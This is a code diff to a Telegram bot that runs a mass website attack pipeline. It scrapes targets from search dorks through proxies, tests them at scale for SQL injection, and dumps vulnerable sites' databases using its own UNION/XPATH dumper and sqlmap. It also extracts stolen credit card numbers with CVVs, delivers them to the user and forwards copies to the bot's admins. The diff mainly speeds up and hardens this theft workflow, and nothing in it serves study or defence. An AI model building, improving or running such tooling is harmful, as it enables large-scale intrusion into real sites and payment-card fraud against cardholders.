+            "💉 Sᴛᴇᴘ 2: 12-Cᴏʀᴇ Anti-Stuck SQLi Verification...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8795,10 +8844,10 @@ async def _run_dump_pipeline(
     else:
         msg = await update.message.reply_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            "📑︎ 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙚𝙨𝙚 1/3\n"
+            "📑︎ 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 1/3\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
             f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
-            "🔍 Sᴛᴇᴘ 1: Sᴄʀᴀᴘɪɴɢ URLs Fʀᴏᴍ Dᴏʀᴋs...\n\n"
+            "🔍 Sᴛᴇᴘ 1: 12-Cᴏʀᴇ Sᴄʀᴀᴘɪɴɢ URLs Fʀᴏᴍ Dᴏʀᴋs...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8806,7 +8855,7 @@ async def _run_dump_pipeline(
 
         async def on_parse_progress(done, total_, found, retries):
             now = time.monotonic()
-            if now - last_edit[0] < 1.0:
+            if now - last_edit[0] < 1.2:
                 return
             last_edit[0] = now
             pct    = int((done / total_) * 100) if total_ else 0
@@ -8818,7 +8867,7 @@ async def _run_dump_pipeline(
                     "📑 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 1/3\n"
                     "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                     f"✅ Dᴏʀᴋs Pᴀʀsᴇᴅ : `{done:,} / {total_:,}`\n"
-                    f"📈 URLs Fᴏᴜɴᴅ : `{found:,}`\n\n"
+                    f"📈 URLs Fᴏᴜɴᴅ  : `{found:,}`\n\n"
                     f"`[{bar}]` {pct}%",
                     reply_markup=stop_kb,
                     parse_mode=ParseMode.MARKDOWN,
@@ -8828,10 +8877,10 @@ async def _run_dump_pipeline(
 
         found_urls = await search_urls_from_dorks(
             dorks,
-            limit=25_000,
+            limit=max(250_000, total_dorks * 3),
             progress_callback=on_parse_progress,
             stop_event=stop_event,
-            proxy_list=effective_proxy_pool(update.effective_user.id),
+            proxy_list=effective_proxy_pool(uid),
         )
 
         if stop_event.is_set() or not found_urls:
@@ -8839,21 +8888,36 @@ async def _run_dump_pipeline(
             await msg.edit_text(
                 f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
                 f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
-                f"📈 URLs : `{len(found_urls):,}`\n\n"
-                "Tʀʏ Mᴏʀᴇ Dᴏʀᴋs Fᴏʀ Bᴇᴛᴛᴇʀ Rᴇsᴜʟᴛs.",
+                f"📈 URLs : `{len(found_urls):,}`",
                 parse_mode=ParseMode.MARKDOWN,
             )
+            stop_events.pop(uid, None)
             await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
             return MENU
 
-    # ── PHASE 2: 12-CORE DOUBLE-VERIFIED SQLi SCANNING ────────────────────────
+        # Immediately send scraped URLs `.txt` BEFORE Phase 2 starts so user never loses parsed URLs!
+        try:
+            _p1_bytes = "\n".join(found_urls).encode("utf-8")
+            if len(_p1_bytes) <= 44 * 1024 * 1024:
+                await update.message.reply_document(
+                    document=io.BytesIO(_p1_bytes),
+                    filename=f"lucifer_phase1_urls_{len(found_urls)}_{ts}.txt",
+                    caption=f"📈 Phase 1 Complete — `{len(found_urls):,}` URLs Scraped! Starting Phase 2 SQLi...",
+                    parse_mode=ParseMode.MARKDOWN,
+                    read_timeout=180.0,
+                    write_timeout=180.0,
+                )
+        except Exception:
+            pass
+
+    # ── PHASE 2: 12-CORE WORK-STEALING ANTI-STUCK SQLi SCANNING ──────────────
     try:
         await msg.edit_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
             f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-            f"📈 URLs Fᴏᴜɴᴅ : `{len(found_urls):,}`\n"
-            "💉 Sᴛᴇᴘ 2: 12-Cᴏʀᴇ 4-Vᴇᴄᴛᴏʀ SQLi Vᴇʀɪꜰɪᴄᴀᴛɪᴏɴ...\n\n"
+            f"📈 Fᴜʟʟ URLs : `{len(found_urls):,}`\n"
+            "💉 Sᴛᴇᴘ 2: 12-Cᴏʀᴇ Work-Stealing SQLi Verification...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8873,7 +8937,7 @@ async def _run_dump_pipeline(
                 f"📈 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ : `{done_n:,}/{tot_n:,}` (All `{len(found_urls):,}` Covered)\n"
                 f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ    : `{vuln_n:,}` | 💀 Dᴇᴀᴅ: `{dead_n:,}`\n\n"
                 f"`[{bar}]` {pct}%\n\n"
-                "_12-Core Direct 4-Vector SQLi Verification..._",
+                "_12-Core Anti-Stuck V6 SQLi Verification..._",
                 reply_markup=stop_kb,
                 parse_mode=ParseMode.MARKDOWN,
             )
@@ -8881,45 +8945,66 @@ async def _run_dump_pipeline(
             pass
 
     _p2_stats    = await run_mass_sqli_12core(found_urls, user_id=uid, progress_cb=_pipe_prog_cb, stop_event=stop_event)
-    vuln_urls    = [u for u, _ in _p2_stats["vuln"]]
+    vuln_pairs   = _p2_stats["vuln"]
+    vuln_urls    = [u for u, _ in vuln_pairs]
     tested_count = [_p2_stats["tested"]]
 
-    if stop_event.is_set() or not vuln_urls:
+    if not vuln_urls:
         reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_event.is_set() else "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs"
         await msg.edit_text(
             f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
             f"📈 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ : `{tested_count[0]:,}` (From `{len(found_urls):,}` URLs)\n"
-            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ    : `{len(vuln_urls):,}`\n\n"
-            "_Nᴏ Iɴᴊᴇᴄᴛᴀʙʟᴇs Fᴏᴜɴᴅ Iɴ Tʜɪs Bᴀᴛᴄʜ._",
+            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ    : `0`",
             parse_mode=ParseMode.MARKDOWN,
         )
+        stop_events.pop(uid, None)
         await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
         return MENU
 
-    # ── PHASE 3: SQLMAP DATABASE DUMP (REST API + fallback subprocess) ───────
-    o        = _get_sqlopts(uid)
-    eng      = o["engine"]
-    use_bulk = o["bulk"]
-    lvl      = o["level"]
-    rsk      = o["risk"]
-    tech     = o["technique"]
-    tamp     = o["tamper"]
-    threads  = o["threads"]
-    crawl    = o["crawl"]
-    eng_tag  = "REST API" if eng == "api" else "Subprocess"
+    # IMMEDIATELY deliver confirmed Vulnerable URLs `.txt` BEFORE Phase 3 DB Dump even starts!
+    try:
+        await update.message.reply_document(
+            document=io.BytesIO("\n".join(vuln_urls).encode("utf-8")),
+            filename=f"sqli_vulnerable_{len(vuln_urls)}_{ts}.txt",
+            caption=(
+                f"🎭 Phase 2 Complete — `{len(vuln_urls):,}` Confirmed Vulnerable URLs!\n"
+                f"🔥 Now Starting Turbo Phase 3 Database + CC Extraction..."
+            ),
+            parse_mode=ParseMode.MARKDOWN,
+            read_timeout=180.0,
+            write_timeout=180.0,
+        )
+        await update.message.reply_document(
+            document=io.BytesIO("\n".join(f"{u}  # [{det}]" for u, det in vuln_pairs).encode("utf-8")),
+            filename=f"sqli_detailed_vectors_{len(vuln_urls)}_{ts}.txt",
+            caption=f"📋 Verified SQLi Vector Breakdown (`{len(vuln_urls):,}` Targets)",
+            parse_mode=ParseMode.MARKDOWN,
+            read_timeout=180.0,
+            write_timeout=180.0,
+        )
+    except Exception:
+        pass
 
+    if stop_event.is_set():
+        stop_events.pop(uid, None)
+        await update.message.reply_text("🛑 Pipeline Stopped — Vulnerable URLs Saved Above ⬆️", reply_markup=make_main_menu())
+        return MENU
+
+    # ── PHASE 3: HYBRID TURBO ASYNC UNION/XPATH DUMPER + FAST DIRECT SQLMAP ──
+    # IMPORTANT: NEVER pass dead `global_proxy_pool` free proxies into DB dumpers!
+    clean_custom_proxies = list(user_proxies.get(uid, []))
+    all_cards    = []
+    dump_results = []
+    dumped_urls_set = set()
+
+    # Stage 3A: Instant 100-Concurrent Pure-Python UNION + XPATH Extraction (`14s` max/site — NEVER hangs!)
     try:
         await msg.edit_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3*\n"
+            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3A/3 (Turbo Async Dump)*\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
             f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ URLs : `{len(vuln_urls):,}`\n"
-            f"🎠 Eɴɢɪɴᴇ         : *{eng_tag}*\n"
-            f"♨️ Lᴇᴠᴇʟ/Rɪsᴋ      : `L{lvl}R{rsk}`\n"
-            f"🧤 Tᴇᴄʜɴɪǫᴜᴇ       : `{tech}`\n"
-            f"🛡️ Tᴀᴍᴘᴇʀ         : `{tamp[:40]}`\n"
-            f"⚜️ Bᴜʟᴋ Mᴏᴅᴇ       : `{'ON' if use_bulk else 'OFF'}`\n\n"
-            "🕳️ Dᴜᴍᴘɪɴɢ Dᴀᴛᴀʙᴀsᴇs — ZIPs Wɪʟʟ Bᴇ Sᴇɴᴛ Sᴏᴏɴ Aᴄᴄᴏʀᴅɪɴɢ Sɪᴛᴇ...\n\n"
+            "⚡ Sᴛᴀɢᴇ 3A : `100-Concurrent UNION/XPATH Instant DB Dump`...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8927,165 +9012,207 @@ async def _run_dump_pipeline(
     except Exception:
         pass
 
-    all_cards    = []
-    ts           = datetime.now().strftime("%d%m%y_%H%M")
-    last_log     = [""]
-    dump_results = []
+    async def _on_turbo_dump_prog(d_done, d_tot, d_ok):
+        now = time.monotonic()
+        if now - last_edit[0] < 1.4:
+            return
+        last_edit[0] = now
+        pct = int((d_done / d_tot) * 100) if d_tot else 0
+        filled = int(pct / 5)
+        bar = "█" * filled + "░" * (20 - filled)
+        try:
+            await msg.edit_text(
+                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3A/3 (Turbo Async Dump)*\n"
+                "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{d_tot:,}` sites\n"
+                f"⚡ Pʀᴏᴄᴇssᴇᴅ  : `{d_done:,}/{d_tot:,}`\n"
+                f"🕳️ DBs Dᴜᴍᴘᴇᴅ : `{d_ok:,}`\n\n"
+                f"`[{bar}]` {pct}%",
+                reply_markup=stop_kb,
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        except Exception:
+            pass
 
-    if eng == "api" and await ensure_api_server():
-        # ── REST API MODE ──────────────────────────────────────────────────────
-        async def on_dump_progress_api(done, total_, success):
-            now = time.monotonic()
-            if now - last_edit[0] < 2.0:
-                return
-            last_edit[0] = now
-            pct    = int((done / total_) * 100) if total_ else 0
-            filled = int(pct / 5)
-            bar    = "█" * filled + "░" * (20 - filled)
-            log_snippet = last_log[0][:120].replace("`", "'") if last_log[0] else "_sqlmap running..._"
+    fast_dumps = await dump_multiple(
+        vuln_urls,
+        stop_event=stop_event,
+        progress_cb=_on_turbo_dump_prog,
+        max_concurrent=80,
+        proxy_list=clean_custom_proxies,
+    )
+    if fast_dumps:
+        txt_blocks = []
+        for dr in fast_dumps:
+            dumped_urls_set.add(dr.url)
+            dump_results.append(dr)
+            if dr.cards:
+                all_cards.extend(dr.cards)
+            hdr = f"{'='*64}\nURL: {dr.url}\nDB : {dr.db_name} | Tables: {', '.join(dr.tables[:15])}\n{'='*64}"
+            body_lines = []
+            for tname, rows in dr.dumped.items():
+                body_lines.append(f"\n--- TABLE: {tname} ({len(rows)} rows) ---")
+                body_lines.extend(rows[:200])
+            txt_blocks.append(hdr + "\n" + "\n".join(body_lines))
+        full_dump_bytes = "\n\n".join(txt_blocks).encode("utf-8", errors="ignore")
+        if len(full_dump_bytes) <= 44 * 1024 * 1024:
             try:
-                await msg.edit_text(
-                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (REST API)*\n"
-                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
-                    f"🐊 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
-                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
-                    f"💳 Cᴄ Hɪᴛs  : `{len(all_cards):,}`\n\n"
-                    f"`[{bar}]` {pct}%\n\n"
-                    f"📡 `{log_snippet}`",
-                    reply_markup=stop_kb,
+                await update.message.reply_document(
+                    document=io.BytesIO(full_dump_bytes),
+                    filename=f"turbo_db_dumps_{len(fast_dumps)}_{ts}.txt",
+                    caption=(
+                        f"🕳️ *Stage 3A Turbo DB Dump Complete!*\n"
+                        f"✅ `{len(fast_dumps):,}` Databases Extracted Instantly\n"
+                        f"💳 CC Hits Found So Far: `{len(all_cards):,}`"
+                    ),
                     parse_mode=ParseMode.MARKDOWN,
+                    read_timeout=180.0,
+                    write_timeout=180.0,
                 )
             except Exception:
                 pass
 
-        async def on_each_result_api(r: ApiTaskResult, zip_bytes: bytes):
-            if r.cards:
-                all_cards.extend(r.cards)
-            dump_results.append(r)
-            if zip_bytes:
-                domain = (r.url.split("/")[2][:40] if "/" in r.url else r.url[:40]) if r.url else "unknown"
-                banner_txt = f"\n🐊 `{r.banner[:60]}`" if r.banner else ""
-                db_txt     = f"\n🔰 `{r.current_db[:40]}`" if r.current_db else ""
+    # Stage 3B: Run fast `50s`-capped parallel SQLMap ONLY on remaining un-dumped targets!
+    remaining_for_sqlmap = [u for u in vuln_urls if u not in dumped_urls_set]
+    o        = _get_sqlopts(uid)
+    eng      = o["engine"]
+    lvl      = o["level"]
+    rsk      = o["risk"]
+    tech     = o["technique"]
+    tamp     = o["tamper"]
+    threads  = max(o["threads"], 8)
+    crawl    = o["crawl"]
+    eng_tag  = "Turbo Async + REST API" if eng == "api" else "Turbo Async + SQLMap"
+    last_log = [""]
+
+    if remaining_for_sqlmap and not stop_event.is_set():
+        if eng == "api" and await ensure_api_server():
+            async def on_dump_progress_api(done, total_, success):
+                now = time.monotonic()
+                if now - last_edit[0] < 1.8:
+                    return
+                last_edit[0] = now
+                pct    = int((done / total_) * 100) if total_ else 0
+                filled = int(pct / 5)
+                bar    = "█" * filled + "░" * (20 - filled)
+                log_snippet = last_log[0][:120].replace("`", "'") if last_log[0] else "_sqlmap deep pass..._"
                 try:
-                    await update.message.reply_document(
-                        document=io.BytesIO(zip_bytes),
-                        filename=f"sqlmap_{domain}_{ts}.zip",
-                        caption=(
-                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
-                            f"📈 `{r.url[:80]}`"
-                            f"{banner_txt}{db_txt}\n"
-                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
-                        ),
+                    await msg.edit_text(
+                        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                        f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3B/3 (Deep SQLMap)*\n"
+                        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                        f"🎭 Rᴇᴍᴀɪɴɪɴɢ  : `{done:,}/{total_:,}` sites\n"
+                        f"🕳️ Tᴏᴛᴀʟ Dᴜᴍᴘs : `{len(dump_results) + success:,}`\n"
+                        f"💳 CC Hɪᴛs    : `{len(all_cards):,}`\n\n"
+                        f"`[{bar}]` {pct}%\n\n"
+                        f"📡 `{log_snippet}`",
+                        reply_markup=stop_kb,
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
                     pass
 
-        def on_log_line(url: str, line: str):
-            last_log[0] = line
+            async def on_each_result_api(r: ApiTaskResult, zip_bytes: bytes):
+                if r.cards:
+                    all_cards.extend(r.cards)
+                dump_results.append(r)
+                if zip_bytes:
+                    domain = (r.url.split("/")[2][:40] if "/" in r.url else r.url[:40]) if r.url else "unknown"
+                    try:
+                        await update.message.reply_document(
+                            document=io.BytesIO(zip_bytes),
+                            filename=f"sqlmap_{domain}_{ts}.zip",
+                            caption=(
+                                f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
+                                f"📈 `{r.url[:80]}`\n"
+                                f"💳 CC Hɪᴛs: `{len(r.cards)}`"
+                            ),
+                            parse_mode=ParseMode.MARKDOWN,
+                            read_timeout=180.0,
+                            write_timeout=180.0,
+                        )
+                    except Exception:
+                        pass
 
-        if use_bulk:
-            # One sqlmap task for all URLs (--bulk-file)
-            bulk_result = await api_bulk_dump(
-                vuln_urls,
-                proxy_list   = effective_proxy_pool(uid),
-                level        = lvl,
-                risk         = rsk,
-                technique    = tech,
-                threads      = threads,
-                tamper       = tamp,
-                stop_event   = stop_event,
-                log_cb       = lambda line: None,
-            )
-            if bulk_result.success:
-                dump_results.append(bulk_result)
-                all_cards.extend(bulk_result.cards)
-        else:
             await api_dump_multiple(
-                vuln_urls,
-                proxy_list     = effective_proxy_pool(uid),
+                remaining_for_sqlmap,
+                proxy_list     = clean_custom_proxies,
                 level          = lvl,
                 risk           = rsk,
                 technique      = tech,
                 threads        = threads,
                 tamper         = tamp,
                 crawl_depth    = crawl,
+                task_timeout   = 50,
                 stop_event     = stop_event,
                 progress_cb    = on_dump_progress_api,
                 per_result_cb  = on_each_result_api,
-                log_sample_cb  = on_log_line,
+                log_sample_cb  = lambda u, line: last_log.__setitem__(0, line),
             )
+        else:
+            sqlmap_base = tempfile.mkdtemp(prefix="loop_sqlmap_")
 
-    else:
-        # ── SUBPROCESS FALLBACK MODE ──────────────────────────────────────────
-        sqlmap_base = tempfile.mkdtemp(prefix="loop_sqlmap_")
-
-        async def on_dump_progress_sub(done, total_, success):
-            now = time.monotonic()
-            if now - last_edit[0] < 2.0:
-                return
-            last_edit[0] = now
-            pct    = int((done / total_) * 100) if total_ else 0
-            filled = int(pct / 5)
-            bar    = "█" * filled + "░" * (20 - filled)
-            try:
-                await msg.edit_text(
-                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (𝙎𝙪𝙗𝙥𝙧𝙤𝙘𝙚𝙨𝙨)*\n"
-                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
-                    f"🧤 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
-                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
-                    f"💳 CC Hɪᴛs  : `{len(all_cards):,}`\n\n"
-                    f"`[{bar}]` {pct}%\n\n"
-                    "_sqlmap subprocess running..._",
-                    reply_markup=stop_kb,
-                    parse_mode=ParseMode.MARKDOWN,
-                )
-            except Exception:
-                pass
-
-        async def on_each_result_sub(r: SqlmapResult, zip_bytes: bytes):
-            if r.cards:
-                all_cards.extend(r.cards)
-            dump_results.append(r)
-            if zip_bytes:
-                domain = r.url.split("/")[2][:40] if r.url else "unknown"
+            async def on_dump_progress_sub(done, total_, success):
+                now = time.monotonic()
+                if now - last_edit[0] < 1.8:
+                    return
+                last_edit[0] = now
+                pct    = int((done / total_) * 100) if total_ else 0
+                filled = int(pct / 5)
+                bar    = "█" * filled + "░" * (20 - filled)
                 try:
-                    await update.message.reply_document(
-                        document=io.BytesIO(zip_bytes),
-                        filename=f"sqlmap_{domain}_{ts}.zip",
-                        caption=(
-                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
-                            f"📈 `{r.url[:80]}`\n"
-                            f"🔖 CSV Fɪʟᴇs: `{r.csv_files}`\n"
-                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
-                        ),
+                    await msg.edit_text(
+                        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                        f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3B/3 (Deep SQLMap)*\n"
+                        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                        f"🎭 Rᴇᴍᴀɪɴɪɴɢ  : `{done:,}/{total_:,}` sites\n"
+                        f"🕳️ Tᴏᴛᴀʟ Dᴜᴍᴘs : `{len(dump_results) + success:,}`\n"
+                        f"💳 CC Hɪᴛs    : `{len(all_cards):,}`\n\n"
+                        f"`[{bar}]` {pct}%",
+                        reply_markup=stop_kb,
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
                     pass
 
-        await sqlmap_dump_multiple(
-            vuln_urls,
-            base_dir     = sqlmap_base,
-            proxy_list   = effective_proxy_pool(uid),
-            stop_event   = stop_event,
-            progress_cb  = on_dump_progress_sub,
-            per_result_cb= on_each_result_sub,
-        )
-        try:
+            async def on_each_result_sub(r: SqlmapResult, zip_bytes: bytes):
+                if r.cards:
+                    all_cards.extend(r.cards)
+                dump_results.append(r)
+                if zip_bytes:
+                    domain = r.url.split("/")[2][:40] if r.url else "unknown"
+                    try:
+                        await update.message.reply_document(
+                            document=io.BytesIO(zip_bytes),
+                            filename=f"sqlmap_{domain}_{ts}.zip",
+                            caption=(
+                                f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
+                                f"📈 `{r.url[:80]}`\n"
+                                f"💳 CC Hɪᴛs: `{len(r.cards)}`"
+                            ),
+                            parse_mode=ParseMode.MARKDOWN,
+                            read_timeout=180.0,
+                            write_timeout=180.0,
+                        )
+                    except Exception:
+                        pass
+
+            await sqlmap_dump_multiple(
+                remaining_for_sqlmap,
+                base_dir      = sqlmap_base,
+                proxy_list    = clean_custom_proxies,
+                stop_event    = stop_event,
+                progress_cb   = on_dump_progress_sub,
+                per_result_cb = on_each_result_sub,
+            )
             shutil.rmtree(sqlmap_base, ignore_errors=True)
-        except Exception:
-            pass
 
+    stop_events.pop(uid, None)
     all_cards = list(dict.fromkeys(all_cards))
-
-    stopped = stop_event.is_set()
-    status  = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
-    emoji   = "🛑" if stopped else "✅"
+    stopped   = stop_event.is_set()
+    status    = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
+    emoji     = "🛑" if stopped else "✅"
 
     await msg.edit_text(
         "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
@@ -9095,9 +9222,9 @@ async def _run_dump_pipeline(
         f"📈 URLs Fᴏᴜɴᴅ       : `{len(found_urls):,}`\n"
         f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ       : `{len(vuln_urls):,}`\n"
         f"🕳️ Sɪᴛᴇs Dᴜᴍᴘᴇᴅ     : `{len(dump_results):,}`\n"
-        f"💳 CC Hɪᴛs : `{len(all_cards):,}`\n"
+        f"💳 CC Hɪᴛs          : `{len(all_cards):,}`\n"
         f"🔧 Eɴɢɪɴᴇ           : *{eng_tag}*\n\n"
-        f"{emoji} Pipeline done. Files above ⬆️",
+        f"{emoji} 100% Complete — Zero Hang! Files above ⬆️",
         parse_mode=ParseMode.MARKDOWN,
     )
 
@@ -9110,24 +9237,20 @@ async def _run_dump_pipeline(
             caption=(
                 f"💳 `{len(all_cards):,}` CC Hɪᴛs\n"
                 "Format: `number|MM|YY|cvv`\n"
-                "🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ — Sǫʟ-Mᴀᴘ REST API Pɪᴘᴇʟɪɴᴇ"
+                "🕷️ Sᴘɪᴅᴇʏ 12-Cᴏʀᴇ V6 Pɪᴘᴇʟɪɴᴇ"
             ),
             parse_mode=ParseMode.MARKDOWN,
+            read_timeout=180.0,
+            write_timeout=180.0,
         )
-        uid_ = update.effective_user.id
-        if uid_ not in ADMIN_IDS:
+        if uid not in ADMIN_IDS:
             for _aid in ADMIN_IDS:
                 try:
                     await context.bot.send_document(
                         chat_id=_aid,
                         document=io.BytesIO(cc_bytes),
                         filename=cc_fname,
-                        caption=(
-                            f"💥 *Aʟᴇʀᴛ — Usᴇʀ* `{uid_}`\n"
-                            f"💳 `{len(all_cards):,}` CC Hɪᴛs found!\n"
-                            "Fᴏʀᴍᴀᴛ: `CCN|MM|YY|cvv`\n"
-                            "⚡ Sǫʟ-Mᴀᴘ Rᴇsᴛ API Pɪᴘᴇʟɪɴᴇ"
-                        ),
+                        caption=f"💥 *Aʟᴇʀᴛ — Usᴇʀ* `{uid}`\n💳 `{len(all_cards):,}` CC Hɪᴛs found!",
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
@@ -9221,7 +9344,7 @@ async def gdork_dump_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     result = await api_google_dork_dump(
         dork,
-        proxy_list   = effective_proxy_pool(uid),
+        proxy_list   = list(user_proxies.get(uid, [])),
         level        = lvl,
         risk         = rsk,
         technique    = o["technique"],
